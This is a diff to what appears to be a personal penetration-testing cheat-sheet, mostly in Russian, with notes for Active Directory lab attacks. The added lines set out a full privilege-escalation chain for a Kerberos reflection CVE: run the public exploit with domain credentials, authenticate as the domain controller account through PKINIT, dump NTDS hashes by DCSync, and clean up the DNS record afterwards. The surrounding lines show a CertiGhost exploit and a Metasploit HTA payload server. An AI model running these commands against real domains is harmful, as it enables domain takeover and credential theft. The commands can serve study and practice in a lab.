@@ -1914,7 +1914,28 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		https://github.com/marcgoam/CVE-2026-54121-CertiGhost
 		sudo pip install --break-system-packages git+https://github.com/fortra/impacket.git cryptography pyasn1 asn1crypto pycryptodome dnspython
 		sudo python3 certighost.py -d lab.local -u max -p 'P@ssword123!' --dc-ip 192.168.0.200
+
+# Kerberos Reflection (CVE-2026-26128) — LPE → SYSTEM напрямую
+
+	https://github.com/jarnovandenbrink/CVE-2026-26128
 	
+	b. Запуск эксплойта от max:
+	python3 CVE-2026-26128.py 'lab02.local/max:P@ssword123!' -t 'http://dc02.lab02.local/certsrv/certfnsh.asp' -l 192.168.56.1 -dc-ip 192.168.56.103 -s 60 --lootdir ./loot
+
+	c. TGT для DC02$ из сертификата (PKINIT):
+	certipy-ad auth -pfx loot/DC02.pfx -username 'DC02$' -domain lab02.local -dc-ip 192.168.56.103
+
+	d. DCSync → хеш администратора:
+	nxc smb 192.168.56.103 -d lab02.local -u 'DC02$' -H 'b2656c0160a057ea5e239933a2d70ec7' --ntds	
+	
+	а. Очистка возможной остаточной DNS-записи (из директории эксплойта):
+	python3 - <<'EOF'
+	from lib.dns.dns import DNSTool
+	from lib.utils.utils import unicode
+	t = DNSTool('lab02.local', 'max', 'P@ssword123!', '192.168.56.103')
+	t.remove(unicode('dc02.lab02.local'))
+	EOF
+
 # Произвольное выполнение файла
 
 	msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j" 
